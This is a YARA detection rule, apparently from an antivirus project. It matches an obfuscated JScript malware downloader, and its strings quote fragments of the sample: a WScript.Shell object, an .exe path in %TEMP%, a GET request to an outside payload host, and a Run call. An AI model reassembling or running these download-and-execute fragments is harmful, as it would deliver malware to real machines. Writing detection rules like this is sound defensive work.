rule sig_20160328_c11ffd26c5a21fc7799c83c948ac9454 {
  meta:
    description = "datamaliciousorder - file 20160328_c11ffd26c5a21fc7799c83c948ac9454.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "7c1f266304528a340790c0387807744adcb099633c4adc9a1d273e71e572c5ac"

  strings:
    $x1  = "function Spyidvztms() {return Vvjvtkmg[\"ExpandEnvironmentStrings\"](\"%TEMP%/\") + \"PsrmV7J9G3ITH4.exe\";};" fullword ascii
    $s2  = "do {WScript[Zmdfv](Fkbyy() * 11)} while (Gwmrquwl[\"readystate\"] < 2 * 2);" fullword ascii
    $s3  = "var Vvjvtkmg = function Etxjj() {return WScript[Jjlkdvv](\"WScript.Shell\");}();" fullword ascii
    $s4  = "function Tilngk(Mxtmd, Rdiytdgn){return Mxtmd - Rdiytdgn;};" fullword ascii
    $s5  = "Gwmrquwl[Tbalemukvt](\"GET\", \"http://lovelustandliving.ca/pow2lk\", false);" fullword ascii
    $s6  = "function Ghocnal() {return ((Oudjrnh == true) && (Oudjrnh == Gzzfhl)) ? 1 : Qisyr;};" fullword ascii
    $s7  = "function Maysty(Vcfgjgzsbg){Vvjvtkmg[\"Run\"](Vcfgjgzsbg, Qisyr, Qisyr);};" fullword ascii
    $s8  = "function Hoxnpgmul()" fullword ascii
    $s9  = "var Ecqkb = new this[\"Date\"]();" fullword ascii
    $s10 = "Oudjrnh = true; " fullword ascii
    $s11 = "return Tilngk(Opprqen, Kqnmyfgba);" fullword ascii
    $s12 = "var Gzzfhl = false;" fullword ascii
    $s13 = "function Quhvhxtotx(Sfhitmz) {var Rnbtcbkh = (1, 2, 3, 4, 5, Sfhitmz); return Rnbtcbkh;};" fullword ascii
    $s14 = " while (Ubjwb){" fullword ascii
    $s15 = "function Piejw(){return Jjlkdvv;};" fullword ascii
    $s16 = "function Okvmzo(){return Rwedsqw;};" fullword ascii
    $s17 = "function Fkbyy(){return 22;};" fullword ascii
    $s18 = "Gzzfhl = true; " fullword ascii
    $s19 = "var Zwiwj = false;" fullword ascii
    $s20 = "var Oudjrnh = false;" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    1 of ($x*) and 4 of them
}